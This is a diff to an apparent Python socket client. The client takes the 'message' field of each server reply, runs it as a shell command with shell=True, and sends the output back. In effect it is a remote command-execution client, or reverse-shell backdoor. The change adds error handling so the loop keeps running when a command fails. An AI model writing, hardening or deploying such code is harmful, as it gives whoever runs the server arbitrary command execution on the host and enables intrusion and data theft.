@@ -17,10 +17,14 @@ def main():
             break
         response = json.loads(response)
         print("Server's response:", response)
-        #client_socket.sendall(json.dumps(response).encode())
-        output = subprocess.check_output(response["message"], shell=True)
-        print(output)
-        client_socket.sendall(json.dumps({"message": output.decode()}).encode())
+        output = ""
+        try:
+            output = subprocess.check_output(response["message"], shell=True)
+            output = output.decode()
+        except subprocess.CalledProcessError as e:
+            output = "Error: " + str(e)
+            print("Error:", e)
+        client_socket.sendall(json.dumps({"message": output}).encode())
 
     client_socket.close()
 
